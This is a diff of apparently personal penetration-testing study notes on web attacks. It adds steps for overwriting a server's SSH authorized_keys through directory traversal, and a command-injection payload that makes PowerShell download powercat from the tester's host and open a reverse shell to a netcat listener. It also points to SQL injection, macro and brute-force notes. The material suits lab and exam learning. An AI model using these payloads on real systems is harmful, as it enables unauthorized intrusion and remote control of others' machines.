@@ -186,15 +186,43 @@ kali@kali:~$ curl http://example.com/subdir/uploads/simple-backdoor.pHP?cmd=powe
 
 - With Burp, try testing directory traversal by modifying the file's name. If the response includes the modified pathname, then it's a good sign that it worked, though it could've just sanitized it internally.
 
-- If this works, then try to blindly overwrite write in the database, such as the ssh key:
+- If this works, then try to blindly overwrite write in the database, such as the ssh key, and then ssh in:
 
 ```bash
 kali@kali:~$ ssh-keygen
 kali@kali:~$ cat keyname.pub > authorized_keys
 ```
 
-Then, use the method is told above on the path "../../../../../../../root/.ssh/authorized_keys", noting that you can try a username instead or "~/.ssh/authorized_keys" or "%USERPROFILE%\.ssh\authorized_keys" for Windows. If you can read /etc/passwd, then adjust to the names. Make sure to delete the known_hosts file if $idk
+Then, use the method as told above on the path "../../../../../../../root/.ssh/authorized_keys" or "/home/www-data/.ssh/authorized_keys", noting that you can try a username instead or "~/.ssh/authorized_keys" or "%USERPROFILE%\.ssh\authorized_keys" for Windows. If you can read /etc/passwd, then adjust to the names. Make sure to delete the known_hosts file if you have used the key with another machine. I assume that you can also just create a new one to use without deleting the file.
 
-69. SQL Injection
+20. OS Command Injection
+
+If there's any part of the website that intakes commands, see if you can add your own. They're likely filtered, though you may be able to get around this by closing off the command with a semicolon. In the following example, we saw (with Burp) that the commands were being sent through the Archive header with a Post:
+
+```bash
+curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive # to find out if the commands are executed by CMD or Powershell
+```
+
+Given that it's Powershell:
+
+```bash
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+nc -lvnp 4444
+curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
+```
+
+21. SQL Injection
 
 - Refer to ./sqli.md
+
+22. Client-Side Attacks
+
+If there if a section where you can mail the company, refer to ../notes/client_side_attacks.md. Also look out for svc, anything where files with Macros can be accepted.
+
+23. Exiftool
+
+Use exiftool to analyze a few documents on the website, see what information you can get. Wget will give you better information than curl.
+
+24. Brute-Force Passwords
+
+Refer to ../notes/password_cracking.md
